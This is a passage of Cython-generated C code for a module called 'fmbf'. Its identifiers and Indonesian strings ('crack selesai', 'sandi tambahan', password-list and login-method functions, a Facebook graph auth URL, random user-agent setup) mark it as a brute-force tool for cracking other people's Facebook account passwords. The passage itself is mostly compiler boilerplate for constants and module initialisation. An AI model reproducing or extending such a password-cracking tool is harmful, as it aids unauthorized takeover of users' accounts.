  __pyx_tuple__52 = PyTuple_Pack(1, __pyx_kp_s_2_method_mbasic_slow); if (unlikely(!__pyx_tuple__52)) __PYX_ERR(0, 213, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__52);
  __Pyx_GIVEREF(__pyx_tuple__52);

  
  __pyx_tuple__53 = PyTuple_Pack(1, __pyx_kp_s_3_method_mobile_super_slow); if (unlikely(!__pyx_tuple__53)) __PYX_ERR(0, 214, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__53);
  __Pyx_GIVEREF(__pyx_tuple__53);

  
  __pyx_tuple__54 = PyTuple_Pack(1, __pyx_kp_s_method); if (unlikely(!__pyx_tuple__54)) __PYX_ERR(0, 215, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__54);
  __Pyx_GIVEREF(__pyx_tuple__54);

  
  __pyx_tuple__55 = PyTuple_Pack(1, __pyx_kp_s_gunakan_untuk_pemisah_contoh_sa); if (unlikely(!__pyx_tuple__55)) __PYX_ERR(0, 225, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__55);
  __Pyx_GIVEREF(__pyx_tuple__55);

  
  __pyx_tuple__56 = PyTuple_Pack(1, __pyx_kp_s_sandi_tambahan); if (unlikely(!__pyx_tuple__56)) __PYX_ERR(0, 226, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__56);
  __Pyx_GIVEREF(__pyx_tuple__56);

  
  __pyx_tuple__57 = PyTuple_Pack(1, __pyx_kp_s_kata_sandi_minimal_6_karakter); if (unlikely(!__pyx_tuple__57)) __PYX_ERR(0, 228, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__57);
  __Pyx_GIVEREF(__pyx_tuple__57);

  
  __pyx_tuple__59 = PyTuple_Pack(3, Py_None, Py_None, Py_None); if (unlikely(!__pyx_tuple__59)) __PYX_ERR(0, 232, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__59);
  __Pyx_GIVEREF(__pyx_tuple__59);

  
  __pyx_tuple__60 = PyTuple_Pack(1, __pyx_kp_s_crack_selesai); if (unlikely(!__pyx_tuple__60)) __PYX_ERR(0, 270, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__60);
  __Pyx_GIVEREF(__pyx_tuple__60);

  
  __pyx_tuple__63 = PyTuple_Pack(2, __pyx_kp_s_data_ugent, __pyx_n_s_r); if (unlikely(!__pyx_tuple__63)) __PYX_ERR(0, 278, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__63);
  __Pyx_GIVEREF(__pyx_tuple__63);

  
  __pyx_tuple__64 = PyTuple_Pack(2, __pyx_int_1, __pyx_int_26); if (unlikely(!__pyx_tuple__64)) __PYX_ERR(0, 281, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__64);
  __Pyx_GIVEREF(__pyx_tuple__64);

  
  __pyx_tuple__65 = PyTuple_Pack(2, __pyx_int_20000000, __pyx_int_30000000); if (unlikely(!__pyx_tuple__65)) __PYX_ERR(0, 282, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__65);
  __Pyx_GIVEREF(__pyx_tuple__65);
  __pyx_tuple__66 = PyTuple_Pack(2, __pyx_int_20000, __pyx_int_40000); if (unlikely(!__pyx_tuple__66)) __PYX_ERR(0, 282, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__66);
  __Pyx_GIVEREF(__pyx_tuple__66);

  
  __pyx_tuple__67 = PyTuple_Pack(1, __pyx_kp_s_https_graph_facebook_com_auth_lo); if (unlikely(!__pyx_tuple__67)) __PYX_ERR(0, 283, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__67);
  __Pyx_GIVEREF(__pyx_tuple__67);

  
  __pyx_tuple__76 = PyTuple_Pack(1, __pyx_kp_s_anda_bisa_mematikan_data_selula); if (unlikely(!__pyx_tuple__76)) __PYX_ERR(0, 339, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__76);
  __Pyx_GIVEREF(__pyx_tuple__76);

  
  __pyx_tuple__77 = PyTuple_Pack(2, __pyx_int_300, __pyx_int_325); if (unlikely(!__pyx_tuple__77)) __PYX_ERR(0, 21, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__77);
  __Pyx_GIVEREF(__pyx_tuple__77);
  __pyx_tuple__78 = PyTuple_Pack(2, __pyx_int_1, __pyx_int_8); if (unlikely(!__pyx_tuple__78)) __PYX_ERR(0, 21, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__78);
  __Pyx_GIVEREF(__pyx_tuple__78);

  
  __pyx_tuple__79 = PyTuple_Pack(26, __pyx_n_s_A, __pyx_n_s_B, __pyx_n_s_C, __pyx_n_s_D, __pyx_n_s_E, __pyx_n_s_F, __pyx_n_s_G, __pyx_n_s_H, __pyx_n_s_I, __pyx_n_s_J, __pyx_n_s_K, __pyx_n_s_L, __pyx_n_s_M, __pyx_n_s_N, __pyx_n_s_O, __pyx_n_s_P, __pyx_n_s_Q, __pyx_n_s_R, __pyx_n_s_S, __pyx_n_s_T, __pyx_n_s_U, __pyx_n_s_V, __pyx_n_s_W, __pyx_n_s_X, __pyx_n_s_Y, __pyx_n_s_Z); if (unlikely(!__pyx_tuple__79)) __PYX_ERR(0, 24, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__79);
  __Pyx_GIVEREF(__pyx_tuple__79);

  
  __pyx_tuple__80 = PyTuple_Pack(2, __pyx_int_10, __pyx_int_90); if (unlikely(!__pyx_tuple__80)) __PYX_ERR(0, 25, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__80);
  __Pyx_GIVEREF(__pyx_tuple__80);

  
  __pyx_tuple__81 = PyTuple_Pack(2, __pyx_int_70, __pyx_int_150); if (unlikely(!__pyx_tuple__81)) __PYX_ERR(0, 29, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__81);
  __Pyx_GIVEREF(__pyx_tuple__81);
  __pyx_tuple__82 = PyTuple_Pack(2, __pyx_n_s__36, __pyx_kp_s__32); if (unlikely(!__pyx_tuple__82)) __PYX_ERR(0, 29, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__82);
  __Pyx_GIVEREF(__pyx_tuple__82);

  
  __pyx_tuple__83 = PyTuple_Pack(1, __pyx_n_s_self); if (unlikely(!__pyx_tuple__83)) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__83);
  __Pyx_GIVEREF(__pyx_tuple__83);
  __pyx_codeobj__84 = (PyObject*)__Pyx_PyCode_New(1, 0, 1, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__83, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_fmbf_py, __pyx_n_s_init, 40, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__84)) __PYX_ERR(0, 40, __pyx_L1_error)

  
  __pyx_tuple__85 = PyTuple_Pack(1, __pyx_n_s_self); if (unlikely(!__pyx_tuple__85)) __PYX_ERR(0, 45, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__85);
  __Pyx_GIVEREF(__pyx_tuple__85);
  __pyx_codeobj__86 = (PyObject*)__Pyx_PyCode_New(1, 0, 1, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__85, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_fmbf_py, __pyx_n_s_logo, 45, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__86)) __PYX_ERR(0, 45, __pyx_L1_error)

  
  __pyx_tuple__87 = PyTuple_Pack(6, __pyx_n_s_self, __pyx_n_s_cookie, __pyx_n_s_url, __pyx_n_s_regex, __pyx_n_s_get, __pyx_n_s_token_2); if (unlikely(!__pyx_tuple__87)) __PYX_ERR(0, 55, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__87);
  __Pyx_GIVEREF(__pyx_tuple__87);
  __pyx_codeobj__88 = (PyObject*)__Pyx_PyCode_New(1, 0, 6, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__87, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_fmbf_py, __pyx_n_s_login, 55, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__88)) __PYX_ERR(0, 55, __pyx_L1_error)

  
  __pyx_tuple__89 = PyTuple_Pack(7, __pyx_n_s_self, __pyx_n_s_token_2, __pyx_n_s_cok, __pyx_n_s_cookie, __pyx_n_s_nama, __pyx_n_s_ask, __pyx_n_s_user); if (unlikely(!__pyx_tuple__89)) __PYX_ERR(0, 82, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__89);
  __Pyx_GIVEREF(__pyx_tuple__89);
  __pyx_codeobj__90 = (PyObject*)__Pyx_PyCode_New(1, 0, 7, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__89, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_fmbf_py, __pyx_n_s_menu, 82, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__90)) __PYX_ERR(0, 82, __pyx_L1_error)

  
  __pyx_tuple__91 = PyTuple_Pack(9, __pyx_n_s_self, __pyx_n_s_user, __pyx_n_s_fields, __pyx_n_s_token_2, __pyx_n_s_cookie, __pyx_n_s_headers, __pyx_n_s_params, __pyx_n_s_url, __pyx_n_s_i); if (unlikely(!__pyx_tuple__91)) __PYX_ERR(0, 124, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__91);
  __Pyx_GIVEREF(__pyx_tuple__91);
  __pyx_codeobj__92 = (PyObject*)__Pyx_PyCode_New(5, 0, 9, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__91, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_fmbf_py, __pyx_n_s_publik, 124, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__92)) __PYX_ERR(0, 124, __pyx_L1_error)

  
  __pyx_tuple__93 = PyTuple_Pack(11, __pyx_n_s_self, __pyx_n_s_ua, __pyx_n_s_file, __pyx_n_s_z, __pyx_n_s_versi_chrome, __pyx_n_s_versi_android, __pyx_n_s_anj, __pyx_n_s_ugent, __pyx_n_s_versi_iphone, __pyx_n_s_model_device, __pyx_n_s_build_device); if (unlikely(!__pyx_tuple__93)) __PYX_ERR(0, 139, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__93);
  __Pyx_GIVEREF(__pyx_tuple__93);
  __pyx_codeobj__94 = (PyObject*)__Pyx_PyCode_New(1, 0, 11, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__93, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_fmbf_py, __pyx_n_s_set_ugent, 139, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__94)) __PYX_ERR(0, 139, __pyx_L1_error)

  
  __pyx_tuple__95 = PyTuple_Pack(9, __pyx_n_s_self, __pyx_n_s_res, __pyx_n_s_folder, __pyx_n_s_num, __pyx_n_s_dirs, __pyx_n_s_fil, __pyx_n_s_ask, __pyx_n_s_file, __pyx_n_s_z); if (unlikely(!__pyx_tuple__95)) __PYX_ERR(0, 176, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__95);
  __Pyx_GIVEREF(__pyx_tuple__95);
  __pyx_codeobj__96 = (PyObject*)__Pyx_PyCode_New(1, 0, 9, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__95, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_fmbf_py, __pyx_n_s_cek_result, 176, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__96)) __PYX_ERR(0, 176, __pyx_L1_error)

  
  __pyx_tuple__97 = PyTuple_Pack(1, __pyx_n_s_self); if (unlikely(!__pyx_tuple__97)) __PYX_ERR(0, 203, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__97);
  __Pyx_GIVEREF(__pyx_tuple__97);
  __pyx_codeobj__98 = (PyObject*)__Pyx_PyCode_New(1, 0, 1, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__97, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_fmbf_py, __pyx_n_s_init, 203, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__98)) __PYX_ERR(0, 203, __pyx_L1_error)

  
  __pyx_tuple__99 = PyTuple_Pack(5, __pyx_n_s_self, __pyx_n_s_method_2, __pyx_n_s_urutan, __pyx_n_s_xx, __pyx_n_s_pwx); if (unlikely(!__pyx_tuple__99)) __PYX_ERR(0, 210, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__99);
  __Pyx_GIVEREF(__pyx_tuple__99);
  __pyx_codeobj__100 = (PyObject*)__Pyx_PyCode_New(1, 0, 5, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__99, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_fmbf_py, __pyx_n_s_atursandi, 210, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__100)) __PYX_ERR(0, 210, __pyx_L1_error)

  
  __pyx_tuple__101 = PyTuple_Pack(9, __pyx_n_s_self, __pyx_n_s_pw, __pyx_n_s_fall, __pyx_n_s_data, __pyx_n_s_pwx, __pyx_n_s_user, __pyx_n_s_nama, __pyx_n_s_depan, __pyx_n_s_z); if (unlikely(!__pyx_tuple__101)) __PYX_ERR(0, 231, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__101);
  __Pyx_GIVEREF(__pyx_tuple__101);
  __pyx_codeobj__102 = (PyObject*)__Pyx_PyCode_New(2, 0, 9, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__101, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_fmbf_py, __pyx_n_s_sandi, 231, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__102)) __PYX_ERR(0, 231, __pyx_L1_error)

  
  __pyx_tuple__103 = PyTuple_Pack(12, __pyx_n_s_self, __pyx_n_s_user, __pyx_n_s_pwx, __pyx_n_s_pw, __pyx_n_s_ua, __pyx_n_s_ses, __pyx_n_s_params, __pyx_n_s_headers, __pyx_n_s_post, __pyx_n_s_cookie, __pyx_n_s_genexpr, __pyx_n_s_genexpr); if (unlikely(!__pyx_tuple__103)) __PYX_ERR(0, 272, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__103);
  __Pyx_GIVEREF(__pyx_tuple__103);
  __pyx_codeobj__104 = (PyObject*)__Pyx_PyCode_New(3, 0, 12, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__103, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_fmbf_py, __pyx_n_s_metode_api, 272, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__104)) __PYX_ERR(0, 272, __pyx_L1_error)

  
  __pyx_tuple__105 = PyTuple_Pack(15, __pyx_n_s_self, __pyx_n_s_user, __pyx_n_s_pwx, __pyx_n_s_url, __pyx_n_s_pw, __pyx_n_s_ua, __pyx_n_s_ses, __pyx_n_s_get, __pyx_n_s_data, __pyx_n_s_post, __pyx_n_s_cookie, __pyx_n_s_x, __pyx_n_s_y, __pyx_n_s_key, __pyx_n_s_value); if (unlikely(!__pyx_tuple__105)) __PYX_ERR(0, 303, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__105);
  __Pyx_GIVEREF(__pyx_tuple__105);
  __pyx_codeobj__106 = (PyObject*)__Pyx_PyCode_New(4, 0, 15, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__105, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_fmbf_py, __pyx_n_s_metode_validate, 303, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__106)) __PYX_ERR(0, 303, __pyx_L1_error)

  
  __pyx_tuple__107 = PyTuple_Pack(1, __pyx_n_s_self); if (unlikely(!__pyx_tuple__107)) __PYX_ERR(0, 336, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__107);
  __Pyx_GIVEREF(__pyx_tuple__107);
  __pyx_codeobj__108 = (PyObject*)__Pyx_PyCode_New(1, 0, 1, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__107, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_fmbf_py, __pyx_n_s_simpan_hasil, 336, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__108)) __PYX_ERR(0, 336, __pyx_L1_error)
  __Pyx_RefNannyFinishContext();
  return 0;
  __pyx_L1_error:;
  __Pyx_RefNannyFinishContext();
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitGlobals(void) {
  __pyx_umethod_PyDict_Type_get.type = (PyObject*)&PyDict_Type;
  if (__Pyx_InitStrings(__pyx_string_tab) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_0 = PyInt_FromLong(0); if (unlikely(!__pyx_int_0)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_1 = PyInt_FromLong(1); if (unlikely(!__pyx_int_1)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_3 = PyInt_FromLong(3); if (unlikely(!__pyx_int_3)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_4 = PyInt_FromLong(4); if (unlikely(!__pyx_int_4)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_8 = PyInt_FromLong(8); if (unlikely(!__pyx_int_8)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_10 = PyInt_FromLong(10); if (unlikely(!__pyx_int_10)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_12 = PyInt_FromLong(12); if (unlikely(!__pyx_int_12)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_15 = PyInt_FromLong(15); if (unlikely(!__pyx_int_15)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_26 = PyInt_FromLong(26); if (unlikely(!__pyx_int_26)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_30 = PyInt_FromLong(30); if (unlikely(!__pyx_int_30)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_32 = PyInt_FromLong(32); if (unlikely(!__pyx_int_32)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_40 = PyInt_FromLong(40); if (unlikely(!__pyx_int_40)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_70 = PyInt_FromLong(70); if (unlikely(!__pyx_int_70)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_90 = PyInt_FromLong(90); if (unlikely(!__pyx_int_90)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_100 = PyInt_FromLong(100); if (unlikely(!__pyx_int_100)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_108 = PyInt_FromLong(108); if (unlikely(!__pyx_int_108)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_110 = PyInt_FromLong(110); if (unlikely(!__pyx_int_110)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_150 = PyInt_FromLong(150); if (unlikely(!__pyx_int_150)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_300 = PyInt_FromLong(300); if (unlikely(!__pyx_int_300)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_325 = PyInt_FromLong(325); if (unlikely(!__pyx_int_325)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_4000 = PyInt_FromLong(4000); if (unlikely(!__pyx_int_4000)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_4900 = PyInt_FromLong(4900); if (unlikely(!__pyx_int_4900)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_20000 = PyInt_FromLong(20000L); if (unlikely(!__pyx_int_20000)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_40000 = PyInt_FromLong(40000L); if (unlikely(!__pyx_int_40000)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_20000000 = PyInt_FromLong(20000000L); if (unlikely(!__pyx_int_20000000)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_30000000 = PyInt_FromLong(30000000L); if (unlikely(!__pyx_int_30000000)) __PYX_ERR(0, 1, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_modinit_global_init_code(void); 
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_export_code(void); 
static CYTHON_SMALL_CODE int __Pyx_modinit_function_export_code(void); 
static CYTHON_SMALL_CODE int __Pyx_modinit_type_init_code(void); 
static CYTHON_SMALL_CODE int __Pyx_modinit_type_import_code(void); 
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_import_code(void); 
static CYTHON_SMALL_CODE int __Pyx_modinit_function_import_code(void); 

static int __Pyx_modinit_global_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_global_init_code", 0);
  
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_export_code", 0);
  
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_export_code", 0);
  
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_init_code(void) {
  __Pyx_RefNannyDeclarations
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_init_code", 0);
  
  if (PyType_Ready(&__pyx_type_4fmbf___pyx_scope_struct__metode_api) < 0) __PYX_ERR(0, 272, __pyx_L1_error)
  #if PY_VERSION_HEX < 0x030800B1
  __pyx_type_4fmbf___pyx_scope_struct__metode_api.tp_print = 0;
  #endif
  if ((CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP) && likely(!__pyx_type_4fmbf___pyx_scope_struct__metode_api.tp_dictoffset && __pyx_type_4fmbf___pyx_scope_struct__metode_api.tp_getattro == PyObject_GenericGetAttr)) {
    __pyx_type_4fmbf___pyx_scope_struct__metode_api.tp_getattro = __Pyx_PyObject_GenericGetAttrNoDict;
  }
  __pyx_ptype_4fmbf___pyx_scope_struct__metode_api = &__pyx_type_4fmbf___pyx_scope_struct__metode_api;
  if (PyType_Ready(&__pyx_type_4fmbf___pyx_scope_struct_1_genexpr) < 0) __PYX_ERR(0, 286, __pyx_L1_error)
  #if PY_VERSION_HEX < 0x030800B1
  __pyx_type_4fmbf___pyx_scope_struct_1_genexpr.tp_print = 0;
  #endif
  if ((CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP) && likely(!__pyx_type_4fmbf___pyx_scope_struct_1_genexpr.tp_dictoffset && __pyx_type_4fmbf___pyx_scope_struct_1_genexpr.tp_getattro == PyObject_GenericGetAttr)) {
    __pyx_type_4fmbf___pyx_scope_struct_1_genexpr.tp_getattro = __Pyx_PyObject_GenericGetAttrNoDict;
  }
  __pyx_ptype_4fmbf___pyx_scope_struct_1_genexpr = &__pyx_type_4fmbf___pyx_scope_struct_1_genexpr;
  __Pyx_RefNannyFinishContext();
  return 0;
  __pyx_L1_error:;
  __Pyx_RefNannyFinishContext();
  return -1;
}

static int __Pyx_modinit_type_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_import_code", 0);
  
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_import_code", 0);
  
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_import_code", 0);
  
  __Pyx_RefNannyFinishContext();
  return 0;
}


#ifndef CYTHON_NO_PYINIT_EXPORT
#define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC
#elif PY_MAJOR_VERSION < 3
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" void
#else
#define __Pyx_PyMODINIT_FUNC void
#endif
#else
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" PyObject *
#else
#define __Pyx_PyMODINIT_FUNC PyObject *
#endif
#endif


#if PY_MAJOR_VERSION < 3
__Pyx_PyMODINIT_FUNC initfmbf(void) CYTHON_SMALL_CODE; 
__Pyx_PyMODINIT_FUNC initfmbf(void)
#else
__Pyx_PyMODINIT_FUNC PyInit_fmbf(void) CYTHON_SMALL_CODE; 
__Pyx_PyMODINIT_FUNC PyInit_fmbf(void)
#if CYTHON_PEP489_MULTI_PHASE_INIT
{
  return PyModuleDef_Init(&__pyx_moduledef);
}
static CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {
    #if PY_VERSION_HEX >= 0x030700A1
    static PY_INT64_T main_interpreter_id = -1;
    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);
    if (main_interpreter_id == -1) {
        main_interpreter_id = current_id;
        return (unlikely(current_id == -1)) ? -1 : 0;
    } else if (unlikely(main_interpreter_id != current_id))
    #else
    static PyInterpreterState *main_interpreter = NULL;
    PyInterpreterState *current_interpreter = PyThreadState_Get()->interp;
    if (!main_interpreter) {
        main_interpreter = current_interpreter;
    } else if (unlikely(main_interpreter != current_interpreter))
    #endif
    {
        PyErr_SetString(
            PyExc_ImportError,
            "Interpreter change detected - this module can only be loaded into one interpreter per process.");
        return -1;
    }
    return 0;
}
static CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *moddict, const char* from_name, const char* to_name, int allow_none) {
    PyObject *value = PyObject_GetAttrString(spec, from_name);
    int result = 0;
    if (likely(value)) {
        if (allow_none || value != Py_None) {
            result = PyDict_SetItemString(moddict, to_name, value);
        }
        Py_DECREF(value);
    } else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Clear();
    } else {
        result = -1;
    }
    return result;
}
static CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject *spec, CYTHON_UNUSED PyModuleDef *def) {
    PyObject *module = NULL, *moddict, *modname;
    if (__Pyx_check_single_interpreter())
        return NULL;
    if (__pyx_m)
        return __Pyx_NewRef(__pyx_m);
    modname = PyObject_GetAttrString(spec, "name");
    if (unlikely(!modname)) goto bad;
    module = PyModule_NewObject(modname);
    Py_DECREF(modname);
    if (unlikely(!module)) goto bad;
    moddict = PyModule_GetDict(module);
    if (unlikely(!moddict)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "loader", "__loader__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "origin", "__file__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "parent", "__package__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "submodule_search_locations", "__path__", 0) < 0)) goto bad;
    return module;
bad:
    Py_XDECREF(module);
    return NULL;
}


static CYTHON_SMALL_CODE int __pyx_pymod_exec_fmbf(PyObject *__pyx_pyinit_module)
#endif
#endif
{
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  long __pyx_t_3;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  Py_ssize_t __pyx_t_6;
  Py_UCS4 __pyx_t_7;
  PyObject *__pyx_t_8 = NULL;
  int __pyx_t_9;
  int __pyx_t_10;
  int __pyx_t_11;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  if (__pyx_m) {
    if (__pyx_m == __pyx_pyinit_module) return 0;
    PyErr_SetString(PyExc_RuntimeError, "Module 'fmbf' has already been imported. Re-initialisation is not supported.");
    return -1;
  }
  #elif PY_MAJOR_VERSION >= 3
  if (__pyx_m) return __Pyx_NewRef(__pyx_m);
  #endif
  #if CYTHON_REFNANNY
__Pyx_RefNanny = __Pyx_RefNannyImportAPI("refnanny");
if (!__Pyx_RefNanny) {
  PyErr_Clear();
  __Pyx_RefNanny = __Pyx_RefNannyImportAPI("Cython.Runtime.refnanny");
  if (!__Pyx_RefNanny)
      Py_FatalError("failed to import 'refnanny' module");
}
#endif
  __Pyx_RefNannySetupContext("__Pyx_PyMODINIT_FUNC PyInit_fmbf(void)", 0);
